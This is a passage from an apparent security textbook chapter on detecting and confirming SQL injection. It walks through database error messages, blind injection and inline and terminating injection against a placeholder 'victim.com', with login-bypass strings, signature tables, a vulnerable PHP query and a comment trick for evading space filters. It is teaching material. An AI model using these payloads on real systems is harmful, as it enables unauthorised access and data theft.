\ninformation disclosed by the database server. Let’s examine the following error:  \njava.sql.SQLException: ORA- 00907: missing right parenthesis  \natoracle.jdbc.dbaccess.DBError.thr owSqlException(DBError.java:134) at  \noracle.jdbc.ttc7.TTIoer.processError(TTIoer.java:289) at  \noracle.jdbc.ttc7.Oall7.receive(Oall7.java:582) at  \noracle.jdbc.ttc7.TTC7Protocol.doOall7(TTC7Protocol.java:1986)  \nThe database reports that there is a missing right parenthesis  in the SQL statement. This \nerror can be returned for a number of reasons. A very typical situation of this is presented \nwhen an attacker has some kind of control in a nested SQL statement. For example:  \nSELECT field1, field2,/∗  Select the first and second fields ∗ /(SELECT field1/∗  Start subquery \n∗/ \nFROM table2  \nWHERE something = [attacker controlled variable])/∗  End subquery ∗ / \nas field3/ ∗ result from subquery ∗ / \nFROM table1  \nThe preceding example shows a nested subquery. The main SEL ECT executes another \nSELECT  enclosed in parentheses. If the attacker injects something in the second query and \ncomments out the rest of the SQL statement, Oracle will return a missing right parenthesis  \nerror.  \nPostgreSQL Errors  \nIn this section we will cover some of the typical errors observed in PostgreSQL databases.  \nThe following PHP code connects to a PostgreSQL database and performs a SELECT query \nbased on the content of a GET HTTP variable:  \n<?php  \n// Connecting, selecting database  \n$dbconn = pg_connect(“host=localhost dbname=books user=tom password=myPassword”)  \n or die(‘Could not connect:’.pg_last_error());  \n$name = $_GET[“name”];  \n// Performing SQL query  \n$query = “SELECT ∗  FROM \\“public\\”.\\“Authors\\ ” WHERE name= ‘$name’”; \n$result = pg_query($dbconn, $query) or die(‘Query failed: ‘. pg_last_error());  \n// Printing results in HTML  \necho “<table>\\ n”; \nwhile ($line = pg_fetch_array($result, null, PGSQL_ASSOC)) {  \n echo “\\t<tr>\\n”; \n foreach ($line as $col_value) {  \n  echo “\\t\\t<td>$col_value</td> \\n”; \n } \n echo “\\t</tr>\\n”; \n} \necho “</table> \\n”; \n// Free resultset  \npg_free_result($result);  \n// Closing connection  \npg_close($dbconn);  \n?> \nThe pg_query  PHP function executes a query using the connection passed as a parameter. \nThe example above creates a SQ L query and stores it into the variable $query , which is later \nexecuted.  \npg_last_error  is a PHP function which gets the last error message string of a connection. \nWe can invoke the code above pointing our browser to the Victim Inc website and supplying \nin the URL a parameter called name : \nhttp://www.victim.com/list_author.php?name=dickens  \nThe request shown above will make the PHP application to execute the following SQL \nquery:  \nSELECT ∗ \nFROM “public”.“Authors”  \nWHERE name=‘dickens’  \nAs you can see in the code s hown above, the application does not perform any validation in \nthe content received in the name  variable. Therefore, the following request will generate an \nerror from the PostgreSQL database.  \nhttp://www.victim.com/list_author.php?name=’  \nGiven the previous request, the database will return an error like the following one:  \nQuery failed: ERROR: unterminated quoted string at or near “’’’”  \nIn other cases, where the SQL code fails to execute for other reasons such as opening or \nclosing parenthesis, subqueries, et c. PostgreSQL databases will return a generic error:  \nQuery failed: ERROR: syntax error at or near “”  \nAnother common configuration for PostgreSQL deployments makes use of the PostgreSQL \nJDBC Driver, which is used when coding Java projects. The errors returned from the database \nare very similar to the ones mentioned above, but they also dump the java functions:  \norg.postgresql.util.PSQLException: ERROR: unterminated quoted string at or near “‘ \\’ ” \nat \norg.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:1512)  \nat org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:1297)  \nat org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:188)  \nat org.postgresql.jdbc2.AbstractJdbc2Statement.execute(AbstractJdbc2Statement.java:430)  \nat \norg.postgresql.jdbc2.AbstractJdbc2Statement.executeWithFlags(AbstractJdbc2Statement.java:3\n32) \nat org.postgresql.jdbc2.AbstractJdbc2Statement.executeQuery(AbstractJdb c2Statement.java:231)  \nat \norg.postgresql.jdbc2.AbstractJdbc2DatabaseMetaData.getTables(AbstractJdbc2DatabaseMetaData.java:2190)\n \nThe preceding code shows an error returned by the PostgreSQL JDBC driver when handling \nand unclosed quoted string.  \nApplication Re sponse \nIn the previous section, you saw the kinds of errors that applications typically display when the \nback -end database fails to execute a query. If you see one of those errors, you can be almost \ncertain that the application is vulnerable to some kind of SQL i njection. However, applications \nreact differently when they receive an error from the database, and sometimes identifying SQL injection vulnerabilities is not as easy as previously shown. In this section, you will see other examples of errors not directly displayed in the browser, which represent different levels of \ncomplexity . \nNote  \nThere is no golden rule to determine whether certain input triggered a SQL injection vulnerability, as the possible \nscenarios are endless.  \nIt is simply important that you remain  focused and pay attention to details when investigating potential SQL \ninjection issues. It is recommended that you use a Web proxy, as your Web browser will hide details such as \nHTML source code, HTTP redirects, and so forth. Besides, when working at a lo wer level and watching the \nHTML source code you are more likely to discover other vulnerabilities apart from SQL injection.  \nThe process of finding SQL injection vulnerabilities involves identifying user data entry, \ntampering with the data sent to the application, and identifying changes in the results returned \nby the server. You have to keep in mind that tampering with the parameters can generate an error which could have nothing to do with SQL injection. \nGeneric Errors  \nIn the previous section, you saw the typical errors returned from the database. In that kind of \nscenario, it is very easy to determine whether a parameter is vulnerable to SQL injection. In other scenarios, the application will return a generic error page regardless of the kind of failure.  \nA good example of this is the Microsoft .NET engine, which by default returns the Server \nError page shown in Figure 2.6 in the event of runtime errors.  \n \nFigure 2.6  Default ASP.NET Error Page  \nThis is a very common scenario. It happens when the application does not handle errors and \nno custom error page has been configured on the server. As I showed before, this behavior is \ndetermined by the web.config file settings.  \nIf you are testing a Web site and discover that the application is always responding with a \ndefault or custom error page, you will need to make sure the error is due  to SQL injection. You \ncan test this by inserting meaningful SQL code into the parameter without triggering an application error.  \nIn the preceding example, you can assume that the SQL query is going to be something such \nas this:  \nSELECT ∗ \nFROM products  \n\nWHERE category=‘[attacker’s control]’  \nInjecting attacker’  is clearly going to generate an error, as the SQL statement is incorrect \ndue to the extra single quote at the end:  \nSELECT ∗ \nFROM products  \nWHERE category=‘attacker’’  \nHowever, you can try to inject something that doesn’t generate an error. This is usually an \neducated trial -and-error process. In our example, we need to keep in mind that we are trying to \ninject data into a string enclosed with single quotes.  \nWhat about injecting something such as bikes’ or ‘1’=’1 ? The resultant SQL statement \nwould be:  \nSELECT ∗ \nFROM products  \nWHERE category=‘bikes’ OR ‘1’=‘1’ /∗  always true - > returns all rows ∗ / \nIn this example, we injected SQL code that created a meaningful correct query. If the \napplication is vulnerable to SQL injection, the preceding query should return every row in the \nproducts  table. This technique is very useful, as it introduces an always t rue condition. \n‘or’1‘=’1  is inserted in line with the current SQL statement and does not affect the other \nparts of the request. The complexity of the query doesn’t particularly matter, as we can easily \ncreate a correct statement.  \nOne of the disadvantages of injecting an always true  condition is that the result of the query \nwill contain every single record in the table. If there are several million records, the query can \ntake a long time to execute and can consume many resources of the database and Web servers. One solution to this is to inject something that will have no effect on the final result; for \nexample, bikes’ or ‘1’=’2. The final SQL query would be:  \nSELECT ∗ \nFROM products  \nWHERE category=‘bikes’ OR ‘1’=‘2’  \nBecause 1 is not equal to 2, and therefore t he condition is false, the preceding statement is \nequivalent to:  \nSELECT ∗ \nFROM products  \nWHERE category=‘bikes’  \nAnother test to perform in this kind of situation is the injection of an always false  statement. \nFor that we will send a value that generates no results; for example, bikes’ AND ‘1’=’2 : \nSELECT ∗ \nFROM products  \nWHERE category=‘bikes’ AND ‘1’=‘2’ /∗  always false - > returns no rows ∗/ \nThe preceding statement should return no results, as the last condition in the WHERE  clause \ncan never be met. However, keep in mind that things are not always as simple as shown in \nthese examples, and don’t be surprised if you inject an always false  condition and the \napplication returns results. This can be due to a number of reasons. For example:  \nSELECT ∗ /∗ Select all ∗ / \nFROM products /∗  products ∗/ \nWHERE category=‘bikes’ AND ‘1’=‘2’ /∗  false condition ∗/ \nUNION SELECT ∗ /∗ append all new_products ∗ / \nFROM new_products /∗  to the previous result set ∗/ \nIn the example above the results of two queries are appended and returned as the result. If \nthe injectable parameter affects only one part of the query, the attacker will receive results even when injecting an always false  condition. Later, in “Terminating  SQL Injection,” you will \nsee techniques to comment out the rest of the query.  \nHTTP Code Errors  \nHTTP has a number of codes which are returned to the Web browser to specify the result of a \nrequest or an action that the client needs to perform. \nThe most comm on HTTP code returned is HTTP 200 OK, which means the request was \nsuccessfully received. There are two error codes that you need to familiarize yourself with to detect SQL injection vulnerabilities. The first one is the HTTP 500 code:  \nHTTP/1.1 500 Internal Server Error  \nDate: Mon, 05 Jan 2009 13:08:25 GMT  \nServer: Microsoft- IIS/6.0  \nX-Powered- By: ASP.NET  \nX-AspNet-Version: 1.1.4322  \nCache-Control: private  \nContent- Type: text/html; charset=utf- 8 \nContent- Length: 3026  \n[HTML content]  \nHTTP 500 is returned from a Web s erver when an error has been found when rendering the \nrequested Web resource. In many scenarios, SQL errors are returned to the user in the form of HTTP 500 error codes. The HTTP code returned will be transparent to you unless you are using a proxy to catc h the Web server response.  \nAnother common behavior adopted by certain applications in the event of errors found is to \nredirect to the home page or to a custom error page. This is done via an HTTP 302 redirection:  \nHTTP/1.1 302 Found  \nConnection: Keep- Alive  \nContent-Length: 159  \nDate: Mon, 05 Jan 2009 13:42:04 GMT  \nLocation: /index.aspx  \nContent- Type: text/html; charset=utf- 8 \nServer: Microsoft- IIS/6.0  \nX-Powered- By: ASP.NET  \nX-AspNet-Version: 2.0.50727  \nCache-Control: private  \n<html><head><title>Object moved</title></head><body>  \n<h2>Object moved to <a href=“/index.aspx”>here</a>.</h2>  \n</body></html>  \nIn the preceding example, the user is redirected to the home page. The HTTP 302 responses \nalways have a Location field which indicates the destination where the Web browser should be \nredirected. As mentioned before, this process is handled by the Web browser and it is \ntransparent to the user unless you are using a Web proxy intercepting the Web server responses.  \nWhen  you are manipulating the parameters sent to the server and you get an HTTP 500 or \nHTTP 302 response, that’s a good sign. It means that somehow you interfered with the normal \nbehavior of the application. The next step will be to craft a meaningful injection, as explained in “Confirming SQL Injection” later in this chapter.  \nDifferent Response Sizes  \nEach application reacts differently to the input sent by the user. Sometimes it is easy to identify an anomaly in an application, yet other times it can be harder . You need to consider even the \nslightest and most subtle variation when trying to find SQL injection vulnerabilities.  \nIn scripts that show the results of a SELECT  statement the differences between a legitimate \nrequest and a SQL injection attempt are usual ly easy to spot. But now consider the scripts \nwhich don’t show any result, or in which the difference is too subtle to be visually noticeable. \nThis is the case for the next example, shown in Figure 2.7.  \n \nFigure 2.7  Response Differing  \nIn Figure 2.7, we have an example of differing of two requests. The test is done against the \nidvisitor  parameter of a Web page called tracking.asp. This page is used to track visitors to the \nhttp://www.victim.com  Web site. The script just updates a database for the visitor specified in \nthe idvisitor  variable. If a SQL error occurs, the exception is caught and the response is \nreturned to the user. However, due to a programming inconsistency the resultant response is slightly different.  \nOther examples can include where minor Web interface items, such as product  labels, are \nloaded based on parameters from the user. If a SQL error occurs, it is not uncommon for missing minor interface items to be easy to overlook. Although it may look like a minor mistake, you will see that there are ways to exploit this kind of issue using blind SQL injection techniques, introduced in the next section and explained in detail in Chapter 5 . \nBlind Injection Detection  \nWeb applications access databases for many purposes. One common goal is to access information and present it to the user. In such cases, an attacker might be able to modify the SQL statement and display arbitrary information from the database into the HTTP  response \nreceived from the web server.  \n\nHowever, there are other cases where it is not possible to display any information from the \ndatabase, but that doesn’t necessarily mean the code can’t be vulnerable to SQL injection. This \nmeans the discovery and expl oitation of the vulnerability is going to be slightly different. \nConsider the following example.  \nVictim Inc. allows its users to log on to its Web site via an authentication form located at \nhttp://www .victim.com/authenticate.aspx . The authentication form requests a username and a \npassword from the user. If you enter any random username and password the result page shows an “Invalid username or password” message. This is something that you would expect.  \nHowever, if you enter a username value of user’ or ‘1’=’1  the error shown in Figure 2.8 is \ndisplayed.  \n \nFigure 2.8  Blind SQL Injection Example —Always True  \nFigure 2.8  shows a flaw in the authentication system of Victim Inc. The application shows \ndifferent error messages when it receives a valid username, and moreover, the username field seems vulnerable to SQL injection. \nWhen you find this kind of situation it can be useful to verify by injecting an always false  \ncondition, as shown in Figure 2.9, and checking that the returned value is different.  \n\n \nFigure 2.9  Blind SQL In jection Example —Always False  \nAfter the always false  test you can confirm that the Username  field is vulnerable to SQL \ninjection. However, the Password  field is not vulnerable and you cannot bypass the \nauthentication form.  \nThis form doesn’t show any data from the database. The only two things we know are:  \n• The form displays “Invalid password” when the Username  condition is true. \n• The form displays “Invalid username or password” when the Username  condition is false. \nThis is  called blind SQL injection. Chapter 5  is fully dedicated to blind SQL injection \nattacks and covers the topic in detail, however we will discuss the basics in this section. \nBlind SQL injection is a type of SQL injectio n vulnerability where the attacker can \nmanipulate a SQL statement and the application returns different values for true and false \nconditions. However, the attacker cannot retrieve the results of the query.  \nExploitation of blind SQL injection vulnerabilitie s needs to be automated, as it is time -\nconsuming and involves sending many requests to the Web server. Chapter 5 discusses the \nexploitation process in detail.  \n\nBlind SQL injection is a very common vulnerability, althoug h sometimes it can be very \nsubtle and might remain undetected to inexperienced eyes. Take a look at the next example so \nthat you can better understand this issue. \nVictim Inc. hosts a Web page on its site, called showproduct.php. The page receives a \nparamet er called id , which uniquely identifies each product in the Web site. A visitor can \nrequest pages as follows:  \nhttp://www.victim.com/showproduct.php?id=1  \nhttp://www.victim.com/showproduct.php?id=2  \nhttp://www.victim.com/showproduct.php?id=3  \nhttp://www.victim.com/showproduct.php?id=4  \nEach request will show the details of the specific product requested as expected. There is \nnothing wrong with this implementation so far. Moreover, Victim Inc. has paid some attention to protecting its Web site and doesn’t display  any database errors to the user.  \nDuring testing of the Web site you discover that the application by default shows the first \nproduct in the event of a potential error. All of the following requests showed the first product (www.victim.com/showproduct.php?id=1):  \nhttp://www.victim.com/showproduct.php?id=attacker  \nhttp://www.victim.com/showproduct.php?id=attacker’  \nhttp://www.victim.com/showproduct.php?id=  \nhttp://www.victim.com/showproduct.php?id=999999 999(non existent product)  \nhttp://www.victim.com/showproduct.php?id=- 1 \nSo far, it seems that Victim Inc. really took security into account in implementing this \nsoftware. However, if we keep testing we can see that the following requests return the product with id=2 : \nhttp://www.victim.com/showproduct.php?id=3 -1 \nhttp://www.victim.com/showproduct.php?id=4 -2 \nhttp://www.victim.com/showproduct.php?id=5 -3 \nThe preceding URLs indicate that the parameter is passed to the SQL statement and it is \nexecuted in the followi ng manner:  \nSELECT ∗ \nFROM products  \nWHERE idproduct=3- 1 \nThe database computes the subtraction and returns the product whose idproduct=2.  \nYou can also perform this test with additions; however, you need to be aware that the \nInternet Engineering Task Force (IETF), in its RFC 2396 (Uniform Resource Identifiers (URI): \nGeneric Syntax), states that the plus sign (+) is a reserved word for URIs an d needs to be \nencoded. The plus sign URL encoding is represented by % 2B. \nThe representation of an example of the attack trying to show the product whose \nidproduct=6 would be any of the following URLs:  \nhttp://www.victim.com/showproduct.php?id=1%2B5(decodes to id=1+5)  \nhttp://www.victim.com/showproduct.php?id=2%2B4(decodes to id=2+4)  \nhttp://www.victim.com/showproduct.php?id=3%2B3(decodes to id=3+3)  \nContinuing the inference process, we can now insert conditions after the id value, creating \ntrue and false result s: \nhttp://www.victim.com/showproduct.php?id=2 or 1=1  \n-- returns the first product  \nhttp://www.victim.com/showproduct.php?id=2 or 1=2  \n-- returns the second product  \nIn the first request, the Web server returns the product whose idproduct=1, whereas in the \nsecond request it returns the product whose idproduct=2.  \nIn the first statement, or 1=1 makes the database return every product. The database detects \nthis as an anomaly and shows the first product.  \nIn the second statement, or 1=2 makes no difference in the re sult, and therefore the flow of \nexecution continues without change.  \nYou might have realized that there are some variations of the attack, based on the same \nprinciples. For example, we could have opted for using the AND  logical operator, instead of \nOR. In that case:  \nhttp://www.victim.com/showproduct.php?id=2 and 1=1  \n-- returns the second product  \nhttp://www.victim.com/showproduct.php?id=2 and 1=2  \n-- returns the first product  \nAs you can see, the attack is almost identical, except that now the true condition re turns the \nsecond product and the false condition returns the first product.  \nThe important thing to note is that we are in a situation where we can manipulate a SQL \nquery but we cannot get data from it. Additionally, the Web server sends a different respons e \ndepending on the condition that we send. We can therefore confirm the existence of blind SQL \ninjection and start automating the exploitation.  \nConfirming SQL Injection  \nIn the previous section, we discussed techniques for discovering SQL injection vulnerabilities by tampering with user data entry and analyzing the response from the server. Once you identify an anomaly you will always need to confirm the SQL injection vulnerability by crafting a valid SQL statement.  \nAlthough there are tricks that will help y ou create the valid SQL statement, you need to be \naware that each application is different and every SQL injection point is therefore unique. This means you will always need to follow an educated trial- and-error process.  \nIdentification of a vulnerability is only part of your goal. Ultimately, your goal will always \nbe to exploit the vulnerabilities present in the tested application, and to do that you need to \ncraft a valid SQL request that is executed in the remote database without causing any errors. \nThis s ection will give you the necessary information to progress from database errors to valid \nSQL statements.  \nDifferentiating Numbers and Strings  \nYou need to derive a basic understanding of SQL language to craft a valid injected SQL statement. The very first lesson to learn for performing SQL injection exploitation is that databases have different data types. These types are represented in different  ways, and we can \nsplit them into two groups:  \n• Number: represented without single quotes  \n• All the rest: represented with single quotes  \nThe following are examples of SQL statements with numeric values:  \nSELECT ∗ FROM products WHERE idproduct=3  \nSELECT ∗ FROM products WHERE value > 200  \nSELECT ∗ FROM products WHERE active = 1  \nAs you can see, when using a numeric value SQL statements don’t use quotes. You will \nneed to take this into account when injecting SQL code into a numeric field, as you will see later in the chapter.  \nThe following are examples of SQL statements with single -quoted values:  \nSELECT ∗ FROM products WHERE name = ‘Bike’  \nSELECT ∗ FROM products WHERE published_date>‘ 01/01/2009’  \nSELECT ∗ FROM products WHERE published_time>‘ 01/01/2009 06:30:00’  \nAs yo u can see in these examples, alphanumeric values are enclosed between single quotes. \nThat is the way the database provides a container for alphanumeric data. Although most databases can deal with number types even if they are enclosed in single quotes this  is not a \ncommon practice, and developers normally use quotes for non- numeric values. When testing \nand exploiting SQL injection vulnerabilities,  you will normally have control over one or more \nvalues within the conditions shown after the WHERE clause. For that reason, you will need to \nconsider the opening and closing of quotes when injecting into a vulnerable string field.  \nHowever, it is possible to represent a numeric value between quotes, and most databases \nwill cast the value to the represented number. M icrosoft SQL server is an exception to this \nnorm, as the + operand is overloaded and interpreted as a concatenation. In that particular case \nthe database will understand it as a string representation of a number; for example, ‘2’+‘2’ = \n‘22’, not 4. \nIn the example above you can see the representation of a date  format. Representation of \ndate/timestamp data types in the different databases doesn’t follow a norm and greatly varies among every database. To avoid these problems most vendors have the option to use  format \nmasks (e.g. ‘DD -MM- YYYY’).  \nInline SQL Injection  \nIn this section, I will show you some examples of inline SQL injection. Inline injection happens when you inject some SQL code in such a way that all parts of the original query are executed.  \nFigure 2.10 shows a representation of an inline SQL injection. \n \nFigure 2.10  Injecting SQL Code Inline  \nInjecting  Strings Inline  \nLet’s see an example that illustrates this kind of attack so that you can fully understand how it works. \nVictim Inc. has an authentication form for accessing the administration part of its Web site. \nThe authentication requires the user to enter a valid username and password. After sending a \n\nusername and password, the application sends a query to the database to validate the user. The \nquery has the following format:  \nSELECT ∗ \nFROM administrators  \nWHERE username = ‘[USER ENTRY]’ AND password = ‘[USER ENTRY]’  \nThe application doesn’t perform any sanitization of the received data, and therefore we have \nfull control over what we send to the server.  \nBe aware that the data entry for both the username and the password is enclosed in two \nsingle quotes which you cannot control. You will have to keep that in mind when crafting a valid SQL statement. Figure 2.11 shows the creation of the SQL statement from the user entry.  \n \nFigure 2.11  SQL Statement Creation  \nFigure 2.11 shows the part of the SQL statement that you can manipulate.  \nNote  \nMost of the art of understanding and exploiting SQL injection vulnerabilities consists of the ability to mentally re -\ncreate what the developer coded in the Web application, and envision how the remote SQL code looks. If you can \nimagine what is being executed at the server side, it will seem obvious  to you where to terminate and start the \nsingle quotes.  \n\nAs I explained ear lier, we first start the finding process by injecting input that might trigger \nanomalies. In this case, we can assume that we are injecting a string field, so we need to make \nsure we inject single quotes. \nEntering a single quote in the Username  field and clicking Send returns the following error:  \nError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL \nserver version for the right syntax to use near ’’’ at line 1  \nThe error indicates that the form is vulnerable to SQL inje ction. The resultant SQL \nstatement given the preceding input is as follows: \nSELECT ∗ \nFROM administrators  \nWHERE username = ’’’ AND password = ’’;  \nThe syntax of the query is wrong due to the injected quote and the database throws an error, \nwhich the Web serv er sends back to the client.  \nOnce we identify the vulnerability, our goal in this scenario is to craft a valid SQL statement \nwhich satisfies the conditions imposed by the application so that we can bypass the authentication control.  \nIn this case, we assume  we are attacking a string value because a username is usually \nrepresented by a string and because injecting a quote returned an Unclosed quotation mark  \nerror. Due to these reasons we are going to inject ’ or ‘1’=’1  in the username field, leaving the \npassw ord blank. The entry will result in the following SQL statement:  \nSELECT ∗ \nFROM administrators  \nWHERE username = ” OR ‘1’=‘1’ AND password = ”;  \nThis statement will not have the intended results. It will not return TRUE  for every field due \nto logical operator  priority. AND  has a higher priority than OR , and therefore we could rewrite \nthe SQL statement as follows to make it easier to understand:  \nSELECT ∗ \nFROM administrators  \nWHERE (username = ’’) OR (‘1’=‘1’ AND password = ’’);  \nThis is not what we wanted to do, as this will return only the rows in the administrators table \nthat contain a blank username or password. We can change this behavior by adding a new OR \ncondition such as ’ or 1=1 or ’1’=’1:  \nSELECT ∗ \nFROM administrators  \nWHERE (username = ’’) OR (1=1) OR (‘1’=‘1’ AND password = ’’);  \nThe new OR  condition makes the statement always return true, and therefore we might \nbypass the authentication process. In the previous section you saw how you could solve this \nscenario by terminat ing the SQL statement; however, you might find a scenario where \ntermination is not possible and the preceding technique is therefore necessary.  \nSome authentication mechanisms cannot be bypassed by returning every row in the \nadministrators  table, as we have done in these examples; they might require just one row to be \nreturned. For those scenarios, you may want to try something such as admin’ and ’1’=’1’ or ’1’=’1 , resulting in the following SQL code:  \nSELECT ∗ \nFROM administrators  \nWHERE username = ‘admin’ AND 1=1 OR ‘1’=‘1’ AND password = ’’;  \nThe preceding statement will return only one row whose username  equals admin. \nRemember that in this case, you need to add two conditions; otherwise, the AND password=’’  \nwould come into play.  \nWe can also inject SQL content in the Password  field, which can be easier in this instance. \nDue to the nature of the statement we would just need to inject a true condition such as ‘ or ’1‘=’1  to craft the following query:  \nSELECT ∗ \nFROM administrators  \nWHERE username = ’’ AND password = ’’ OR ‘1’=‘1’;  \nThis statement will return all content from the administrators  table, thereby successfully \nexploiting the vulnerability.  \nTable 2.1 provides you with a list of injection strin gs that you may need during the \ndiscovery and confirmation process of an inline injection in a string field. \nTable 2.1  Signatures for Inline Injection of Strings  \nTesting String  Variations  Expected Result s \n’  Error triggering. If successful, the database will return an error  \n1’ or ‘1’=’1  1’) or (‘1’=’1  Always true condition. If successful, it returns every row in the \ntable  \nvalue’ or \n‘1’=’2  value’) or \n(‘1’=’2  No condition. If successful, it returns the same result as the \noriginal value  \n1’ and ‘1’=’2  1’) and (‘1’=’2  Always false condition. If successful, it returns no rows from \nthe table  \n1’ or \n‘ab’=‘a’+’b  1’) or \n(‘ab’=‘a’+’b  Microsoft SQL Server concatenation. If successful, it returns \nthe same information as an always true condition  \n1’ or \n‘ab’=‘a’’b  1’) or \n(‘ab’=‘a’’b  MySQL concatenation. If successful, it returns the same \ninformation as an always true condition \n1’ or 1’) or Oracle and PostgreSQL concatenation. If successful, it returns \nTesting String  Variations  Expected Result s \n‘ab’=‘a’||’b  (‘ab’=‘a’||’b  the same information as an always true condition  \nAs you can see, in this section we have covered the basics of inline string injection. All the \nexamples shown in this section were SELECT  queries to clearly illustrate the results of the \ninjections, however it is important to understand the consequences of injecting into other SQL \nqueries.  \nImagine a typical Password Change  functionality on the Victim Inc. website where the user \nhas to enter their old password for confirmation, and supply a new one. The resulting query would be something like the following:  \nUPDATE users  \nSET password = ‘new_password’  \nWHERE username = ‘Bob’ and password = ‘old_password’  \nNow, i f Bob discovers a SQL injection issue affecting the old password  field and injects \n‘OR ‘1’=’1  the resulting query would be:  \nUPDATE users  \nSET password = ‘new_password’  \nWHERE username = ‘Bob’ and password = ‘old_password’ OR ‘1’=‘1’  \nCan you see the consequen ces of the attack? Yes, you guessed right, the attack would update \nevery single password in the users table to new_password and therefore users would not be \nable to log on to the application any more.  \nIt is very important to envisage and understand the code ran on the server, and any potential \nside effects your testing may have, in order to minimize the risks of the SQL injection inference process.  \nSimilarly, a ‘OR ‘1’=’1  injection in a DELETE query could very easily delete all contents of \nthe table, and the refore you will need to be very careful when testing this type of query.  \nInjecting Numeric Values Inline  \nIn the previous section, you saw an example of string inline injection for bypassing an \nauthentication mechanism. You will now see another example where you are going to perform a similar attack against a numeric value.  \nUsers can log in to Victim Inc. and access their profile. They can also check messages sent \nto them by other users. Each user has a unique identifier or uid which is used to uniquely \nidentify each user in the system.  \nThe URL for displaying the messages sent to our user has the following form at: \nhttp://www.victim.com/messages/list.aspx?uid=45  \nWhen testing the uid parameter sending just a single quote, we get the following error:  \nhttp://www.victim.com/messages/list.aspx?uid=’  \nServer Error in ‘/’ Application.  \nUnclosed quotation mark before the character string ‘ ORDER BY received;’.  \nTo gain more information about the query we can send the following request:  \nhttp://www.victim.com/messages/list.aspx?uid=0 having 1=1  \nThe response from the server is:  \nServer Error in ‘/’ Application.  \nColumn ‘messages.uid’ is invalid in the select list because it is not contained in an \naggregate function and there is no GROUP BY clause.  \nBased on the information retrieved, we can assert that the SQL code running on the server \nside should look like this:  \nSELECT ∗ \nFROM messages  \nWHERE uid=[USER ENTRY]  \nORDER BY received;  \nFigure 2.12 shows the injection point, the SQL statement creation, and the vulnerable \nparameter.  \n \nFigure 2.12  Visual Representation of a Numeric Injection  \nNote that injecting a number doesn’t require termi nating and commencing the single -quote \ndelimiters. As I mentioned before, numeric values are handled by the database without \ndelimiting quotes. In this example, we can directly inject after the uid parameter in the URL.  \nIn this scenario, we have control over the messages returned from the database. The \napplication doesn’t perform any sanitization in the uid parameter, and therefore we can \ninterfere in the rows selected from the messages  table. The method of exploitation in this \nscenario is to add an always true (or 1=1 ) condition, so instead of returning only the messages \nfor our user, all of them are displayed. The URL would be:  \nhttp://www.victim.com/messages/list.aspx?uid=45 or 1=1  \nThe result of the request would return messages to every user, as shown in Figure 2.13.  \n\n \nFigure 2.13  Exploitation of a Numeric Injection  \nThe result of the exploitation generated the following SQL statement:  \nSELECT ∗ \nFROM messages  \nWHERE uid=45 or 1=1 /∗  Always true condition ∗ / \nORDER BY received;  \nDue to the always true  condition injected ( or 1=1) the database returns all rows in the \nmessages  table and not just the ones sent to our user. In Cha pter 4 , you will learn how to \nexploit this further to read arbitrary data from any table of the database and even from other \ndatabases.  \nTable 2.2 shows a collection of signatures for testing numeric values.  \nTable 2.2  Signatures for Inline Injection of Numeric Values  \nTesting \nString  Variations  Expected Result s \n’  Error triggering. If successful, the database will return an error  \n\nTesting \nString  Variations  Expected Result s \n1+1 3-1 If successful, it returns the same value as the result of the \noperation  \nvalue + 0   If successful, it returns the same value as the original request  \n1 or 1=1 1) or (1=1  Always true condition. If successful, it returns every row in the \ntable  \nvalue or 1=2  value) or (1=2  No condition. If successful, it returns the same result as the \noriginal value  \n1 and 1=2  1) and (1=2  Always false condition. If successful, it returns no rows from \nthe table  \n1 or ‘ab’= \n‘a’+‘b’  1) or (‘ab’ = \n‘a’+‘b’  Microsoft SQL Server concatenation. This injection is valid for \nMicrosoft SQL Server. If successful, it returns the same \ninformation as an always true condition \n1 or \n‘ab’=‘a’’b’  1) or (‘ab’=‘a’ \n‘b MySQL concatenation. If successful, it returns the same \ninformation as an always true condition \n1 or \n‘ab’=‘a’||‘b’ 1) or \n(‘ab’=‘a’||‘b’ Oracle and PostgreSQL concatenation. If successful, it returns \nthe same information as an always true condition  \nAs you can see from Table 2.2 , all the injection strings follow similar principles. Confirming \nthe existence of a SQL injection vulnerability is just a matter of understanding what is being \nexecuted at server -side and i njecting the conditions that you need for each particular case.  \nTerminating SQL Injection  \nThere are several techniques for confirming the existence of SQL injection vulnerabilities. In \nthe previous section you saw inline injection techniques, and in this s ection you will see how \nto create a valid SQL statement through its termination. Injection -terminating a SQL statement \nis a technique whereby the attacker injects SQL code and successfully finalizes the statement by commenting the rest of the query, which would be otherwise appended by the application. Figure 2.14 shows a diagram introducing the concept of SQL injection termination. \n \nFigure 2.14  Terminating SQL Injection  \nIn Figure 2.14, you can see that the injected code terminates the SQL statement. Apart from \nterminating the statement we need to comment out the rest of the query such that it is not executed.  \nDatabase Comment Syntax  \nAs you can see in Figure 2.14, we need some means to prevent the end of the SQL code from \nbeing executed. The element we are going to use is database comments . Comments in SQL \ncode are similar to comments in any other programming language.  They are used to insert \ninforma tion in the code and they are ignored by the interpreter. Table 2.3 shows the syntax for \nadding comments in Microsoft SQL Server, Oracle, MySQL and PostgreSQLdatabases. \nTip \nA defense technique consists of detecting and  removing all spaces or truncating the value to the first space from \nthe user entry. Multiline comments can be used to bypass such restrictions. Say you are exploiting an application \nusing the following attack:  \nhttp://www.victim.com/messages/list.aspx?uid=45 or 1=1  \nHowever, the application removes the spaces and the SQL statement becomes:  \nSELECT ∗ \n\nFROM messages  \nWHERE uid=45or1=1  \nThis will not return the results you want, but you can add multiline comments with no content to avoid using \nspaces:  \nhttp://www.victim.com/messages/list.aspx?uid=45/ ∗∗/or/∗∗/1=1  \nThe new query will not have spaces in the user input, but it will be valid, returning all of the rows in the \nmessages table.  \nThe “Evading Input Filters” section in Chapter 7  explains in detail this technique and many others used for \nsignature evasion.  \nTable 2.3  Database Comments  \nDatabase  Comment  Observation s \nMicrosoft SQL Server, \nOracle and \nPostgreSQL  -- (double \ndash)  Used for single -line comments  \n /∗ ∗/ Used for multiline comments  \nMySQL  -- (double \ndash)  Used for single -line comments. It requires the second \ndash to be followed by a space or a control character such as tabulation, newline, etc.  \n # Used for single -line comments  \n \n/∗ ∗/ Used for multiline comments  \nThe following technique to confirm the existence of a vulnerability makes use of SQL \ncomments. Have a look at the following request:  \nhttp://www.victim.com/messages/list.aspx?uid=45/ ∗hello∗/ \nIf vulnerable, the application will send the value of the uid followed by a comment. If there \nare no problems processing the request and we get the same result we 